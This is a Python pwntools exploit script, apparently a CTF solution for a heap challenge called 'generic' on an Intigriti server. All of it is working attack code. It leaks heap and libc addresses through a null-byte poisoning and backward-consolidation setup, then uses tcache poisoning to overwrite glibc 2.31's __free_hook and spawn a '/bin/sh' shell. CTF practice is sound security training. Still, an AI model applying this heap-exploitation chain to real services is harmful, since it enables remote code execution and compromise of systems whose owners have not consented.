#!/usr/bin/env python3

from pwn import *

exe = ELF("./generic")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
context.log_level = 'debug'
r = remote("generic.ctf.intigriti.io", 9999)

def s(data):
    r.sendlineafter("> ", data)
    
def ss(data):
    r.sendlineafter(": ", data)

def add_node(t, val):
    s("2")
    s(str(t))
    ss(str(val))

def add_string(data):
    s("2")
    s("4")
    ss(str(len(data)))
    ss(data)


def change_node(index, t, val, data=b""):
    s("3")
    s(str(index))
    s(str(t))
    if data == b"":
        ss(str(val))
    else:
        ss(str(len(data)))
        r.sendafter(": ", data)

def show():
    s("1")


def remove(index):
    s("4")
    s(str(index))

"""
0. Integer
1. Long
2. Double
3. Char
4. String
"""



def main():
    
    add_string("MAHERAZZ")
    change_node(1, 1, "+")
    show()
    r.recvuntil("1. ")
    heap_leak = int(r.recvline().strip())
    log.info("heap leak @ 0x%x", heap_leak)
    heap_base = heap_leak - 0x2d0
    
    for i in range(10):
        add_string(b"A"*(0x20 -1))

    for i in range(11):
        remove(1)
    
    payload  = b"A"*0x10 + p64(0) + p64(0x9b1)
    payload += p64(heap_base + 0x6c0) * 2
    payload += b"\x00"*(0x48 - 1 - len(payload))

    add_string(payload)
    add_string("B"*(0x48-1))
    add_string("C"*(0x208-1))
    add_string("0"*(0x200-1))
    add_string("D"*(0x508-1)) # We will free this one
    add_string((p64(0) + p64(0x21))*((0x5f0-1)//0x10))
    add_string("F"*(0x508-1)) # Just to not consolidate with top chunk.
    add_string(b"H"*(0x208 -1))

    
    # Now removing D
    remove(8)
    remove(5)

    # Rename A and replace D to take advantage of the null byte poisoning.  
    # def change_node(index, t, val, data="")
    change_node(1, 4, 0, b"G"*(0x500) + p64(0x9b0))

    # Backward consolidating
    remove(5)
    add_string(b"1"*(0x60-0x8-1)) 
    add_string(b"2"*(0x70-1))
    show()
    r.recvuntil("3. ")
    libc_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", libc_leak)

    # prepare tcache poisoning
    remove(4)
    libc.address = libc_leak - 0x1ebbe0-0x1000
    log.warn("Libc base @ 0x%x", libc.address)
    free_hook = libc.address + 0x1eee48
    pause()
    add_string(cyclic_metasploit(0x210) + p64(free_hook-0x8))
    pause()
    
    payload = b"Z"*0x18
    payload += p64(0x31)
    payload += p64(0) + p64(0x4)
    payload += p64(heap_base) + p64(0)
    payload += p64(0) + p64(0xc01-0x30)
    payload += p64(libc_leak)*2
    payload += p64(0)*2
    payload += b"Z"*(0x200 - len(payload))
    add_string(payload)
    
    remove(3)
    add_string(b"/bin/sh\x00" + p64(libc.address + 0x522c0) + p8(0)*(0x200-0x10))
    pause()
    s("3")
    s("8")
    s("0")


    r.interactive()


if __name__ == "__main__":
    main()
